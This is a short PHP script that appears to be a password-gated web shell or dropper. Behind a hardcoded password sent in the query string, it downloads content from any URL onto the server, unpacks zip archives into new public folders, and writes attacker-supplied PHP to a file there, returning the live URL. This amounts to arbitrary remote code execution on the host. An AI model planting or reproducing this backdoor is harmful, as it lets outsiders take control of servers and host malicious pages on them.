<?php
header("Content-type: application/json; charset=utf-8");
$pass = 'Jordan developer The Jordan Ghost';
if(!is_dir('IndexFilee')){
  mkdir('IndexFilee');
  file_put_contents("IndexFilee/.htaccess","Deny from all");
}
if($_GET['Pass'] == $pass){
  @$command = $_GET['Command'];
  @$url = $_GET['Url'] ?? "Null";
  @$script = $_GET['Script'];
  @$file = $_GET['File'];
  if ($command == 'Uploade') {
    file_put_contents("IndexFilee/".$script,file_get_contents($url));
    $print = ['ok'=>true];
  }elseif ($command == "New") {
    $id = substr(str_shuffle('Qwertyuiopasdfghjkasdfghjk1234567890'),0,10);
    mkdir($id);
    $zipname = "IndexFilee/".$script;
    $zip = new ZipArchive; 
    if ($zip->open($zipname) === TRUE) { 
      $zip->extractTo(__DIR__."/".$id); 
      $zip->close(); 
		}
	file_put_contents($id."/Nova.php",$file);
	$print = ['ok'=>true,'url'=>'http://'.$_SERVER['SERVER_NAME'].'/'.$id."/index.php"];
  }else{
  	['ok'=>false,'error'=>404];
  }
}else{
  $print = ['ok'=>false,'error'=>500];
}
echo json_encode($print,128|256);
?>